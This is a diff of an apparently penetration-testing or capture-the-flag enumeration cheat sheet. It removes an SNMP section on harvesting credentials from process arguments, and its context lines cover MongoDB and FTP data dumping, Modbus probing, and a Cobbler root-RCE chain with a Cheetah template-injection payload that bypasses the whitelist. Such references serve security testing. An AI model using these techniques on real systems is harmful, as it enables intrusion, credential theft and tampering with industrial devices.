@@ -50,17 +50,6 @@ nc -v TARGET PORT
 - **MongoDB (27017)**: Version fingerprint (`nmap -sV -p27017`), check no-auth access with `pymongo`: `MongoClient(host, 27017).list_database_names()` then `db.list_collection_names()` + `db.collection.find()`. **Compat note**: `mongosh` and `pymongo>=4.0` require MongoDB 4.2+ (wire version 8); for MongoDB 3.x targets use `pip install 'pymongo<4.0'`. Enumerate all DBs — sensitive data often in non-default databases. Check `nmap --script mongodb-info,mongodb-databases -p27017 target`
 - **FTP (21)**: Version fingerprint (`nmap -sV -p21`), check anonymous access (`curl ftp://anonymous:anonymous@target/`), recursively download all files — PDFs, emails, and policy documents often leak default credentials or usernames. **Credential stores**: `.psafe3` (Password Safe — crack with `john --format=pwsafe`), `.kdbx` (KeePass), `.crd`. In AD, check FTP with all compromised accounts — group memberships may grant access. Look for web admin interfaces on alternate ports (e.g., 8443, 5466), config file locations (`/opt/*/Data/*/users/*.xml` for per-user hashes)
 - **Modbus TCP (502)**: ICS/SCADA protocol. No auth by default. Brute-force slave IDs 0-255 with FC 0x2B (device identification). Read coils (FC01), holding registers (FC03). Custom FCs may wrap session-based protocols — enumerate sub-function codes. See `ics-modbus-quickstart.md`
-- **SNMP (UDP/161)**: try the default `public` community string first — no sudo required for `snmpwalk` on macOS/BSD/Linux. The single highest-yield OID is `1.3.6.1.2.1.25.4.2.1.5` (HOST-RESOURCES-MIB::hrSWRunParameters) — dumps the cleartext command-line arguments of every running process, where cron jobs and supervisor-launched scripts frequently leak `-u user -p PASSWORD` style credentials.
-  ```bash
-  snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.5 > recon/snmp-procs-args.txt
-  grep -iE 'pass|pwd|-p |--password|secret|token|key=' recon/snmp-procs-args.txt
-  # Also useful OIDs:
-  #  1.3.6.1.2.1.25.4.2.1.4   hrSWRunPath          (process binary paths)
-  #  1.3.6.1.2.1.25.6.3.1.2   hrSWInstalledName    (installed packages → version-specific CVEs)
-  #  1.3.6.1.2.1.4.20.1.1     ipAdEntAddr          (interface IPs — pivot targets)
-  #  1.3.6.1.2.1.6.13.1       tcpConnTable         (active TCP connections)
-  ```
-  Don't use `nmap -sU -p 161` for the enumeration — it needs root and is much slower. Use `snmpwalk` directly. Other community strings worth trying after `public`: `private`, `community`, `manager`, the company name lowercased, the hostname.
 - **Cobbler XMLRPC (25151)**: Provisioning server, typically loopback-only (pivot via SSH `-L`). Auth with `cobbler:cobbler` — default password hashed in `/etc/cobbler/settings.yaml` (`default_password_crypted`, crackable MD5crypt). Test: `python3 -c "import xmlrpc.client as x; s=x.ServerProxy('http://127.0.0.1:25151/'); print(s.extended_version()); t=s.login('cobbler','cobbler'); print(t)"`. **RCE as root** via Cheetah template injection — chain: `write_autoinstall_template('evil.ks', payload, token)` → `new_distro/new_profile/new_system` (kernel/initrd must live in a cobblerd-readable path — NOT `/tmp` if `PrivateTmp=yes`, use `/var/www/html/skins/` or similar world-writable web path) → `generate_autoinstall('', 'evil_system', False)`. Payload bypass: `#set $os = __import__("os")\n#set $r = $os.popen("id").read()\n$r` — `__import__()` bypasses `cheetah_import_whitelist`. See `injection/reference/ssti-cheat-sheet.md` (Cheetah section).
 
 ### NSE Scripts for Enumeration
